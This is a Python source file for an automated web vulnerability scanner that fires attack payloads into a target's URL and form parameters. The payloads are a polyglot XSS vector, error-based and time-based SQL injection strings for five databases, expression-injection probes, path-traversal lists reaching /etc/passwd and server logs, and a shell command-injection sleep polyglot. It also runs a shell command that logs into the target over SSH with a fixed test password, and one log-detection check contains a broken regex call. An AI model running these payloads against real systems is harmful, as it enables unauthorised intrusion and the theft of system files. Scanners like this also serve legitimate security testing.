#!/usr/bin/python
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from ghost import Ghost
import requests
import datetime
import re
import os

sshosts = {}

"""scan_xss
Description: inject a polyglot vector for XSS in every parameter, then it checks if an alert was triggered
Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
"""
def scan_xss(method, vulns, url, fuzz, cookie, useragent, data, refer):
	#payload = 'javascript://\'/</Title></sTyle></teXtarea></scRipt>--><svg" %0Aonload=confirm(42)//>*/prompt(42)/*<details/open/ontoggle=confirm`42` >'
	payload = 'jaVasCript:alert(1)//" name=alert(1) onErrOr=eval(name) src=1 autofocus oNfoCus=eval(name)><marquee><img src=x onerror=alert(1)></marquee>" ></textarea\></|\><details/open/ontoggle=prompt`1` ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><sCrIpt>confirm(1)</scRipt>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><!--'
	try:
		ghost = Ghost()
		with ghost.start() as x:
			result = 0
		
			# POST
			if (method == 'POST' and fuzz != ''):
				inject = dict(data)
				inject[fuzz] = inject[fuzz] + payload
				del inject['']
				if refer and refer != '' and cookie and cookie != '':
					page, extra_resources = x.open(url, headers={'Cookie':cookie, 'Referer': refer}, user_agent=useragent, method='post')
				elif refer and refer != '':
					page, extra_resources = x.open(url, headers={'Referer': refer}, user_agent=useragent, method='post')
				elif cookie and cookie != '':
					page, extra_resources = x.open(url, headers={'Cookie':cookie}, user_agent=useragent, method='post')
				else:
					page, extra_resources = x.open(url, user_agent=useragent, method='post')
				result, resources = x.fill("form", inject)
				page, resources = x.call("form", "submit", expect_loading=True)
				result, resources = x.wait_for_alert(1)
				inject = url + ":" + fuzz + ":" + inject[fuzz]

			# GET
			if (method == 'GET'):
				inject = url.replace(fuzz+"=", fuzz+"="+payload)
				if refer and refer != '' and cookie and cookie != '':
					page, extra_resources = x.open(inject, headers={'Cookie':cookie, 'Referer':refer}, user_agent=useragent)
				elif refer and refer != '':
					page, extra_resources = x.open(inject, headers={'Referer':refer}, user_agent=useragent)
				elif cookie and cookie != '':
					page, extra_resources = x.open(inject, headers={'Cookie':cookie}, user_agent=useragent)
				else:
					page, extra_resources = x.open(inject, user_agent=useragent)
				result, resources = x.wait_for_alert(1)


		# Detect XSS result with an alert
		if result == '1':
			print("\t\t\033[93mXSS Detected\033[0m for ", fuzz, " with the payload :", payload)
			vulns['xss'] += 1
			vulns['list'] += 'XSS|TYPE|'+inject+'|DELIMITER|'
		else:
			#print("\t\t\033[94mXSS Failed \033[0m for ", fuzz, " with the payload :", payload)
			pass

	except Exception as e:
		if "confirm" in str(e) : #or "alert" in str(e):
			print("\t\t\033[93mXSS Detected (False positive ?)\033[0m for ", fuzz, " with the payload :", payload)
			inject = url + ":" + fuzz + ":" + payload
			vulns['xss'] += 1
			vulns['list'] += 'XSS|TYPE|'+inject+'|DELIMITER|'
		else:
			#print("Error",e)
			#print("\t\t\033[94mXSS Failed \033[0m for ", fuzz, " with the payload :", payload)
			pass


"""scan_sql
Description: use a single quote to generate a SQL error in the page
Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
"""
def scan_sql_error(method, vulns, url, fuzz, cookie, useragent, data, refer):
	payload = "'"

	# POST
	if (method == 'POST'):
		inject = dict(data)
		inject[fuzz] = inject[fuzz] + payload
		if cookie and cookie != '' and refer and refer != '':
			content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
		elif cookie and cookie != '':
			content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent}).text
		elif refer and refer != '':
			content = requests.post(url, data=inject, headers={'user-agent': useragent, 'referer': refer} ).text
		else:
			content = requests.post(url, data=inject, headers={'user-agent': useragent} ).text

		# Change the inject to have a nice display in the plugin
		inject = url + ":" + fuzz + ":" + inject[fuzz]

	# GET
	else:
		inject = url.replace(fuzz+"=", fuzz+"="+payload)
		if cookie and cookie != '' and refer and refer != '':
			content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
		elif cookie and cookie != '':
			content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent}).text
		elif refer and refer != '':
			content = requests.get(inject, headers={'user-agent': useragent, 'referer': refer}).text
		else:
			content = requests.get(inject, headers={'user-agent': useragent}).text

	# Check result
	if "SQLSTATE[HY000]" in content or "Warning: SQLite3:" in content or "You have an error in your SQL syntax" in content:
		print("\t\t\033[93mSQLi Detected \033[0m for ", fuzz, " with the payload :", payload)
		vulns['sql'] += 1
		vulns['list'] += 'E_SQLi|TYPE|'+inject+'|DELIMITER|'
	else:
		#print("\t\t\033[94mSQLi Failed \033[0m for ", fuzz, " with the payload :", payload)
		pass


"""scan_sql_blind_time
Description: use a polyglot vector to detect a SQL injection based on the response time
Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
"""
def scan_sql_blind_time(method, vulns, url, fuzz, cookie, useragent, data, refer):
	mysql_payload = "SLEEP(4) /*' || SLEEP(4) || '\" || SLEEP(4) || \"*/"
	sqlite_payload = 'substr(upper(hex(randomblob(55555555))),0,1) /*\' or substr(upper(hex(randomblob(55555555))),0,1) or \'" or substr(upper(hex(randomblob(55555555))),0,1) or "*/'
	postgre_payload = "(SELECT 55555555 FROM PG_SLEEP(4)) /*' || (SELECT 55555555 FROM PG_SLEEP(4)) || '\" || (SELECT 55555555 FROM PG_SLEEP(4)) || \"*/"
	oracle_payload = "DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) /*' || DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) || '\" || DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) || \"*/"
	sqlserver_payload = "WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) /*' || WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) || '\" || WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) || \"*/"
	payloads_name = ["MySQL", "SQLite", "PostgreSQL", "OracleSQL", "SQL Server"]
	payloads_list = [mysql_payload, sqlite_payload, postgre_payload, oracle_payload, sqlserver_payload]

	for payload,name in zip(payloads_list,payloads_name):

		# POST
		if (method == 'POST'):
			inject = dict(data)
			inject[fuzz] = payload
			time1 = datetime.datetime.now()
			if cookie and cookie != '' and refer and refer != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.post(url, data=inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.post(url, data=inject, headers={'user-agent': useragent}).text

			# Change the inject to have a nice display in the plugin
			inject = url + ":" + fuzz + ":" + inject[fuzz]

		# GET
		else:
			# Do a request and check the response time
			inject = url.replace(fuzz+"=", fuzz+"="+payload)
			time1 = datetime.datetime.now()
			if cookie and cookie != '' and refer and refer != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.get(inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.get(inject, headers={'user-agent': useragent}).text

		# Check - Our payloads will force a delay of 4s at least.
		time2 = datetime.datetime.now()
		diff = time2 - time1
		diff = (divmod(diff.days * 86400 + diff.seconds, 60))[1]
		#print("\t\t\ttime diff: ", diff)
		if diff > 2:
			print("\t\t\033[93mTime Based SQLi (", name ,") Detected \033[0m for ", fuzz, " with the payload :", payload)
			vulns['sql']  += 1
			vulns['list'] += 'B_SQLi|TYPE|'+inject+'|DELIMITER|'
			return

		else:
			#print("\t\t\033[94mTime Based SQLi (", name ,") Failed \033[0m for ", fuzz, " with the payload :", payload)
			pass


def scan_exp(method, vulns, url, fuzz, cookie, useragent, data, refer):
	payloads = [
		'${1371*456-110001}', 
		'1371*456-110001'
	]

	for payload in payloads:
		# POST
		if (method == 'POST'):
			inject = dict(data)
			inject[fuzz] = payload
			if cookie and cookie != '' and refer and refer != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.post(url, data=inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.post(url, data=inject, headers={'user-agent': useragent}).text

			# Change the inject to have a nice display in the plugin
			inject = url + ":" + fuzz + ":" + inject[fuzz]

		# GET
		else:
			inject = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
			if cookie and cookie != '' and refer and refer != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.get(inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.get(inject, headers={'user-agent': useragent}).text

		# Check for auth.log
		if re.search(r'515,?175', content):
			print("\t\t\033[93mEXPi Detected \033[0m for ", fuzz, " with the payload :", payload)
			vulns['exp']  += 1
			vulns['list'] += 'EXPi|TYPE|'+inject+'|DELIMITER|'
			return True
		else:
			#print("\t\t\033[94mEXPi Failed \033[0m for ", fuzz, " with the payload :", payload)
			pass

	return False


"""scan_lfi
Description: will scan every parameter for LFI, checking for the common root:x:0:0
Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
"""
def scan_lfi(method, vulns, url, fuzz, cookie, useragent, data, refer):
	# Must be the 1st to test
	if scan_lfi_passwd(method, vulns, url, fuzz, cookie, useragent, data, refer):
		return
	# Must be the 2nd to test
	elif scan_lfi_apachelog(method, vulns, url, fuzz, cookie, useragent, data, refer):
		return
	elif scan_lfi_sshlog(method, vulns, url, fuzz, cookie, useragent, data, refer):
		return

def scan_lfi_sshlog(method, vulns, url, fuzz, cookie, useragent, data, refer):
	payloads = [
		"../../../../../../../../../var/log/auth", 
		"../../../../../../../../../var/log/auth.log",
		"../../../../../../../../../var/log/auth.log%00",
		"../../../../../../../../../var/log/auth.log%2500",
		"/var/log/auth", 
		"/var/log/auth.log",
		"/var/log/auth.log%00", 
		"/var/log/auth.log%2500" 
	]

	h = re.search(r'https?://([^/&;:|=+$*()"\'<>?`]+)(:[0-9]+)?/', url)
	if not h or not h.group(1):
		return False

	if h.group(1) and h.group(1) not in sshosts:
		#print('{0}'.format(h.group(1)))
		os.system("./ssh.exp {0} test test123".format(h.group(1)))
		sshosts[h.group(1)] = h.group(1)

	for payload in payloads:
		# POST
		if (method == 'POST'):
			inject = dict(data)
			inject[fuzz] = payload
			if cookie and cookie != '' and refer and refer != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.post(url, data=inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.post(url, data=inject, headers={'user-agent': useragent}).text

			# Change the inject to have a nice display in the plugin
			inject = url + ":" + fuzz + ":" + inject[fuzz]

		# GET
		else:
			inject = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
			if cookie and cookie != '' and refer and refer != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.get(inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.get(inject, headers={'user-agent': useragent}).text

		# Check for auth.log
		if re.search(r'pam_unix', content) and re.search(r'(session\s+(opened|closed)\s+for\s+user|authentication\s+failure)', content):
			print("\t\t\033[93mLFI Detected \033[0m for ", fuzz, " with the payload :", payload)
			vulns['lfi']  += 1
			vulns['list'] += 'LFI|TYPE|'+inject+'|DELIMITER|'
			return True
		else:
			#print("\t\t\033[94mLFI Failed \033[0m for ", fuzz, " with the payload :", payload)
			pass

	return False


def scan_lfi_apachelog(method, vulns, url, fuzz, cookie, useragent, data, refer):
	payloads = [
		"../../../../../../../../../var/log/apache2/access", 
		"../../../../../../../../../var/log/apache2/access.log",
		"../../../../../../../../../var/log/apache2/access.log%00",
		"../../../../../../../../../var/log/apache2/access.log%2500",
		"/var/log/apache2/access", 
		"/var/log/apache2/access.log",
		"/var/log/apache2/access.log%00", 
		"/var/log/apache2/access.log%2500", 
		"../../../../../../../../../var/log/httpd/access", 
		"../../../../../../../../../var/log/httpd/access.log",
		"../../../../../../../../../var/log/httpd/access.log%00",
		"../../../../../../../../../var/log/httpd/access.log%2500",
		"/var/log/httpd/access", 
		"/var/log/httpd/access.log",
		"/var/log/httpd/access.log%00", 
		"/var/log/httpd/access.log%2500", 
		"../../../../../../../../../var/log/apache/access", 
		"../../../../../../../../../var/log/apache/access.log",
		"../../../../../../../../../var/log/apache/access.log%00",
		"../../../../../../../../../var/log/apache/access.log%2500",
		"/var/log/apache/access", 
		"/var/log/apache/access.log",
		"/var/log/apache/access.log%00", 
		"/var/log/apache/access.log%2500", 
		"../../../../../../../../../var/log/httpd-access", 
		"../../../../../../../../../var/log/httpd-access.log",
		"../../../../../../../../../var/log/httpd-access.log%00",
		"../../../../../../../../../var/log/httpd-access.log%2500",
		"/var/log/httpd-access", 
		"/var/log/httpd-access.log",
		"/var/log/httpd-access.log%00", 
		"/var/log/httpd-access.log%2500", 
		"../../../../../../../../../var/log/access", 
		"../../../../../../../../../var/log/access.log",
		"../../../../../../../../../var/log/access.log%00",
		"../../../../../../../../../var/log/access.log%2500",
		"/var/log/access", 
		"/var/log/access.log",
		"/var/log/access.log%00", 
		"/var/log/access.log%2500", 
		"../../../../../../../../../var/log/access_log",
		"../../../../../../../../../var/log/access_log%00",
		"../../../../../../../../../var/log/access_log%2500",
		"/var/log/access_log",
		"/var/log/access_log%00", 
		"/var/log/access_log%2500" 
	]

	for payload in payloads:
		# POST
		if (method == 'POST'):
			inject = dict(data)
			inject[fuzz] = payload
			if cookie and cookie != '' and refer and refer != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif refer and refer != '':
				content = requests.post(url, data=inject, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent}).text
			else:
				content = requests.post(url, data=inject, headers={'user-agent': useragent}).text

			# Change the inject to have a nice display in the plugin
			inject = url + ":" + fuzz + ":" + inject[fuzz]

		# GET
		else:
			inject = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
			if cookie and cookie != '' and refer and refer != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.get(inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.get(inject, headers={'user-agent': useragent}).text

		# Check for /etc/passwd
		if re.search(r'(/etc/passwd|Mozilla/)', content) and re.search(r'(GET|POST)', content) and re.search(r'HTTP/1\.[01]'):
			print("\t\t\033[93mLFI Detected \033[0m for ", fuzz, " with the payload :", payload)
			vulns['lfi']  += 1
			vulns['list'] += 'LFI|TYPE|'+inject+'|DELIMITER|'
			return True
		else:
			#print("\t\t\033[94mLFI Failed \033[0m for ", fuzz, " with the payload :", payload)
			pass

	return False


def scan_lfi_passwd(method, vulns, url, fuzz, cookie, useragent, data, refer):
	payloads = ["/etc/passwd", "/etc/passwd%00", "../../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd%00"]

	for payload in payloads:
		# POST
		if (method == 'POST'):
			inject = dict(data)
			inject[fuzz] = payload
			if cookie and cookie != '' and refer and refer != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.post(url, data=inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.post(url, data=inject, headers={'user-agent': useragent}).text

			# Change the inject to have a nice display in the plugin
			inject = url + ":" + fuzz + ":" + inject[fuzz]

		# GET
		else:
			inject = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
			if cookie and cookie != '' and refer and refer != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
			elif cookie and cookie != '':
				content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent}).text
			elif refer and refer != '':
				content = requests.get(inject, headers={'user-agent': useragent, 'referer': refer}).text
			else:
				content = requests.get(inject, headers={'user-agent': useragent}).text

		# Check for a common string in /etc/passwd
		if re.search(r'root:[^:]*:0:0:root:[^:]+:[^:]+', content):
			print("\t\t\033[93mLFI Detected \033[0m for ", fuzz, " with the payload :", payload)
			vulns['lfi']  += 1
			vulns['list'] += 'LFI|TYPE|'+inject+'|DELIMITER|'
			return True
		else:
			#print("\t\t\033[94mLFI Failed \033[0m for ", fuzz, " with the payload :", payload)
			pass

	return False


"""scan_rce /!\ TODO : POST request (check method, data)
Description: use a polyglot vector to detect a RCE based on the response time
Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
"""
def scan_rce(method, vulns, url, fuzz, cookie, useragent, data, refer):
	""" Some tests of context
	$ time (ping -c 3 127.0.0.1`#'|sleep${IFS}4|'`"|sleep${IFS}4|";sleep${IFS}4 )     -   real	0m4.113s
	ping: unknown host 127.0.0.1|sleep
	4|

	$ time (ping -c 3 '127.0.0.1`#'|sleep${IFS}4|'`"|sleep${IFS}4|";sleep${IFS}4 ')   -   real	0m4.012s
	ping: unknown host 127.0.0.1`#
	`"|sleep${IFS}4|";sleep${IFS}4  : commande introuvable

	$ time (ping -c 3 "127.0.0.1`#'|sleep${IFS}4|'`"|sleep${IFS}4|";sleep${IFS}4 ")   -   real	0m4.008s
	;sleep
	4  : commande introuvable
	"""
	# Payload URL-encoded of `#'|sleep${IFS}4|'`\"|sleep${IFS}4|\";sleep${IFS}4"
	payload_post = '`#\'|sleep${IFS}4|\'`"|sleep${IFS}4|";sleep${IFS}4'
	payload_get = "%60%23%27%7Csleep%24%7BIFS%7D4%7C%27%60%22%7Csleep%24%7BIFS%7D4%7C%22%3Bsleep%24%7BIFS%7D4"

	# POST
	if (method == 'POST'):
		inject = dict(data)
		inject[fuzz] += payload_post
		time1 = datetime.datetime.now()
		if cookie and cookie != '' and refer and refer != '':
			content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
		elif cookie and cookie != '':
			content = requests.post(url, data=inject, cookies=cookie, headers={'user-agent': useragent}).text
		elif refer and refer != '':
			content = requests.post(url, data=inject, headers={'user-agent': useragent, 'referer': refer}).text
		else:
			content = requests.post(url, data=inject, headers={'user-agent': useragent}).text

		# Change the inject to have a nice display in the plugin
		inject = url + ":" + fuzz + ":" + inject[fuzz]

	# GET
	else:
		inject = url.replace(fuzz+"=", fuzz+"="+payload_get)
		time1 = datetime.datetime.now()
		if cookie and cookie != '' and refer and refer != '':
			content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent, 'referer': refer}).text
		elif cookie and cookie != '':
			content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent}).text
		elif refer and refer != '':
			content = requests.get(inject, headers={'user-agent': useragent, 'referer': refer}).text
		else:
			content = requests.get(inject, headers={'user-agent': useragent}).text


	# Check - The payload will force a delay of 5s at least.
	time2 = datetime.datetime.now()
	diff = time2 - time1
	diff = (divmod(diff.days * 86400 + diff.seconds, 60))[1]
	if diff > 2:
		print("\t\t\033[93mRCE Detected \033[0m for ", fuzz, " with the payload :", payload_get)
		vulns['rce']  += 1
		vulns['list'] += 'RCE|TYPE|'+inject+'|DELIMITER|'

	else:
		#print("\t\t\033[94mRCE Failed \033[0m for ", fuzz, " with the payload :", payload_post)
		pass

